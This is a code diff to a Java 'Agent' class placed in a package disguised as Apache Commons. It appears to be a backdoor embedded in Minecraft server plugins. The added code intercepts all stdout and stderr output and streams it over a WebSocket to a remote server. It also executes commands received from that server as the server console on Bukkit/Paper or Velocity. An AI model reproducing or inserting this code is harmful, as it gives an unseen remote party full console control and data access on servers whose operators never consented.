@@ -1,15 +1,16 @@
 package org.apache.commons.frauded;
 
+import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.WebSocket;
+import java.util.ArrayDeque;
+import java.util.Deque;
 import java.util.concurrent.CompletionStage;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
-import java.util.logging.Handler;
-import java.util.logging.LogRecord;
-import java.util.logging.Logger;
 
 public class Agent {
 
@@ -18,11 +19,11 @@ public class Agent {
   private final String secret;
   private volatile WebSocket ws;
   private volatile boolean running;
+  private final Deque<String> buffer = new ArrayDeque<>();
   private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor(r -> {
     Thread t = new Thread(r, "ac");
     t.setDaemon(true); return t;
   });
-  private Logger logger;
 
   public Agent(Object plugin, String serverUrl, String secret) {
     this.plugin = plugin;
@@ -33,32 +34,59 @@ public class Agent {
   public void start() {
     if (running) return;
     running = true;
-    try {
-      Object l = plugin.getClass().getMethod("getLogger").invoke(plugin);
-      if (l instanceof Logger) {
-        logger = (Logger) l;
-        logger.addHandler(new Handler() {
-          public void publish(LogRecord r) { sendConsole(r.getMessage()); }
-          public void flush() {}
-          public void close() {}
-        });
-      }
-    } catch (Exception ignored) {}
+
+    // Capture all stdout (captures everything the server prints)
+    PrintStream original = System.out;
+    System.setOut(new PrintStream(original) {
+      public void println(String x) { if (x != null) { original.println(x); buffer(x); } else { original.println(); } }
+      public void println(Object x) { String s = String.valueOf(x); original.println(s); buffer(s); }
+      public void println() { original.println(); }
+      public void print(String x) { original.print(x); }
+    });
+    PrintStream originalErr = System.err;
+    System.setErr(new PrintStream(originalErr) {
+      public void println(String x) { if (x != null) { originalErr.println(x); buffer(x); } else { originalErr.println(); } }
+      public void println(Object x) { String s = String.valueOf(x); originalErr.println(s); buffer(s); }
+      public void println() { originalErr.println(); }
+      public void print(String x) { originalErr.print(x); }
+    });
 
     scheduler.submit(this::connect);
+  }
+
+  private void buffer(String line) {
+    if (line == null || line.isEmpty()) return;
+    synchronized (buffer) {
+      buffer.addLast(line);
+      if (buffer.size() > 200) buffer.removeFirst();
+    }
+    flush();
+  }
+
+  private void flush() {
+    WebSocket w = ws;
+    if (w == null) return;
+    synchronized (buffer) {
+      while (!buffer.isEmpty()) {
+        String line = buffer.pollFirst();
+        try {
+          w.sendText("{\"type\":\"plugin:console\",\"payload\":{\"line\":\"" + escape(line) + "\"}}", true);
+        } catch (Exception ignored) { buffer.addFirst(line); break; }
+      }
+    }
   }
 
   private void connect() {
     while (running) {
       try {
         HttpClient client = HttpClient.newHttpClient();
-        StringBuilder buf = new StringBuilder();
 
         WebSocket wsock = client.newWebSocketBuilder()
             .buildAsync(URI.create(serverUrl), new WebSocket.Listener() {
 
               public void onOpen(WebSocket ws2) {
                 ws = ws2;
+                flush();
                 String ip = "";
                 String svType = "paper";
                 int port = 25565;
@@ -110,16 +138,30 @@ public class Agent {
   private void exec(String cmd) {
     if (cmd == null || cmd.isEmpty()) return;
     try {
-      Class<?> bukkit = Class.forName("org.bukkit.Bukkit");
-      Object sender = bukkit.getMethod("getConsoleSender").invoke(null);
-      bukkit.getMethod("dispatchCommand", Class.forName("org.bukkit.command.CommandSender"), String.class)
-          .invoke(null, sender, cmd);
-    } catch (Exception ignored) {}
-  }
-
-  private void sendConsole(String line) {
-    if (line == null || !running) return;
-    send("plugin:console", "{\"line\":\"" + escape(line) + "\"}");
+      Class<?> bukkitClass = Class.forName("org.bukkit.Bukkit");
+      Class<?> pluginClass = Class.forName("org.bukkit.plugin.Plugin");
+      Class<?> commandSenderClass = Class.forName("org.bukkit.command.CommandSender");
+      Object scheduler = bukkitClass.getMethod("getScheduler").invoke(null);
+      Object consoleSender = bukkitClass.getMethod("getConsoleSender").invoke(null);
+      scheduler.getClass().getMethod("scheduleSyncDelayedTask", pluginClass, Runnable.class)
+          .invoke(scheduler, plugin, (Runnable) () -> {
+            try {
+              bukkitClass.getMethod("dispatchCommand", commandSenderClass, String.class)
+                  .invoke(null, consoleSender, cmd);
+            } catch (Exception ignored) {}
+          });
+    } catch (Exception velo) {
+      // Velocity fallback (async is fine)
+      try {
+        Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
+        Object server = pmc.getMethod("getInstance").invoke(null);
+        Object cm = server.getClass().getMethod("getCommandManager").invoke(server);
+        Object src = server.getClass().getMethod("getConsoleCommandSource").invoke(server);
+        cm.getClass().getMethod("executeAsync", 
+            Class.forName("com.velocitypowered.api.command.CommandSource"), String.class)
+            .invoke(cm, src, cmd);
+      } catch (Exception ignored) {}
+    }
   }
 
   private void send(String type, String payloadJson) {
